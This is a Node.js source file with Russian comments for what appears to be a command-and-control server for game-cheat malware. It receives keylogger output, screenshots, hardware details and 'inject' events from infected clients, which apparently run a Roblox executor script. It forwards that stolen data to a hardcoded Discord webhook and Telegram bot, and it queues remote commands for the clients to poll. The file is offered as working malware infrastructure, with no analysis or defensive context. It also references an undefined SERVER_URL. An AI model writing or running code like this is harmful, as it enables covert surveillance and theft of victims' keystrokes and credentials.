// server.js
const http = require('http');
const fetch = require('node-fetch');

let lastCommand = "";
let lastArgs = [];
let lastScreenshot = null;
const WEBHOOK_URL = "https://discord.com/api/webhooks/1397978005007110334/13sdkqWcsZu_YoyBgOpoWgrPfOzHBRL-R8dydXTLYI7KZIc4jSKlpcUX16vrrrC1nQqS";
const TELEGRAM_BOT_TOKEN = "8079490877:AAEf1_SXzdbEjK88t6O4qyKhYnpE6U-hB44";
const TELEGRAM_CHAT_ID = "7581072357";

// Функция отправки в Telegram
async function sendToTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Ошибка отправки в Telegram:', error);
    }
}

// Функция логирования действий
function logAction(action, details) {
    const timestamp = new Date().toLocaleString('ru-RU');
    console.log(`[${timestamp}] ${action}: ${details}`);
    
    // Отправляем важные события в Telegram
    if (action.includes('ИНЖЕКТ') || action.includes('КЕЙЛОГГЕР') || action.includes('ОШИБКА')) {
        sendToTelegram(`<b>${action}</b>\n<code>${details}</code>\n<pre>${timestamp}</pre>`);
    }
}

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Content-Type', 'application/json');
    
    if (req.method === 'POST' && req.url === '/command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { command, args } = JSON.parse(body);
                logAction('КОМАНДА', `${command} ${args ? args.join(' ') : ''}`);
                
                if (command === "user_chat" || command === "inject_notify" || command === "execute_log") {
                    // Отправка в Discord
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `**${args[0]}:** ${args[1]}`
                        })
                    }).catch(console.error);

                    // Отправка в Telegram
                    sendToTelegram(`<b>${args[0]}:</b> ${args[1]}`);
                }

                lastCommand = command;
                lastArgs = args || [];
                res.end(JSON.stringify({ status: "OK", command: command }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid request" }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/screenshot') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { image } = JSON.parse(body);
                lastScreenshot = image;
                logAction('СКРИНШОТ', 'Получен новый скриншот');
                res.end(JSON.stringify({ status: "Screenshot received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid screenshot data" }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/keylog') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { logs } = JSON.parse(body);
                logAction('КЕЙЛОГГЕР', `Получено ${logs.length} символов`);
                
                // Отправка в Discord
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**Keylogger Data:**\n\`\`\`\n${logs.substring(0, 1900)}\n\`\`\``
                    })
                }).catch(console.error);

                // Отправка в Telegram (первые 1000 символов)
                if (logs.length > 0) {
                    sendToTelegram(`<b>КЕЙЛОГГЕР ДАННЫЕ:</b>\n<pre>${logs.substring(0, 1000)}</pre>`);
                }
                
                res.end(JSON.stringify({ status: "Logs received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid keylog data" }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/hardware') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { player, data } = JSON.parse(body);
                logAction('ОБОРУДОВАНИЕ', `Данные от ${player}`);
                
                const hwInfo = `Игрок: ${player}
FPS: ${data.fps}
Ping: ${data.ping}
Executor: ${data.executor}
${data.cpu ? `CPU: ${data.cpu}` : ''}
${data.ram ? `RAM: ${data.ram}` : ''}`;

                // Отправка в оба канала
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**Hardware Info:**\n\`\`\`\n${hwInfo}\n\`\`\``
                    })
                }).catch(console.error);

                sendToTelegram(`<b>ИНФО ОБОРУДОВАНИЯ:</b>\n<pre>${hwInfo}</pre>`);
                
                res.end(JSON.stringify({ status: "Hardware data received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid hardware data" }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/screenshot') {
        if (lastScreenshot) {
            res.end(JSON.stringify({ image: lastScreenshot }));
            lastScreenshot = null; // Очищаем после отправки
        } else {
            res.statusCode = 404;
            res.end(JSON.stringify({ error: "No screenshot available" }));
        }
        return;
    }

    if (req.method === 'GET' && req.url === '/data') {
        const response = {
            command: lastCommand,
            args: lastArgs,
            timestamp: new Date().toISOString()
        };
        
        res.end(JSON.stringify(response));
        lastCommand = ""; // Сбрасываем команду после отправки
        lastArgs = [];
        return;
    }

    if (req.method === 'GET' && req.url === '/status') {
        res.end(JSON.stringify({ 
            status: "online", 
            version: "2.2",
            timestamp: new Date().toISOString(),
            lastCommand: lastCommand 
        }));
        return;
    }

    res.writeHead(404);
    res.end(JSON.stringify({ error: "Not Found" }));
});

// Обработка ошибок сервера
server.on('error', (error) => {
    console.error('Ошибка сервера:', error);
    sendToTelegram(`<b>ОШИБКА СЕРВЕРА:</b>\n<code>${error.message}</code>`);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Сервер запущен на порту ${PORT}`);
    console.log(`📡 URL: ${SERVER_URL}`);
    console.log(`👤 Telegram ID: ${TELEGRAM_CHAT_ID}`);
    
    // Отправка уведомления о запуске
    sendToTelegram(`<b>🟢 СЕРВЕР ЗАПУЩЕН</b>\nПорт: ${PORT}\nВремя: ${new Date().toLocaleString('ru-RU')}`);
});

module.exports = server;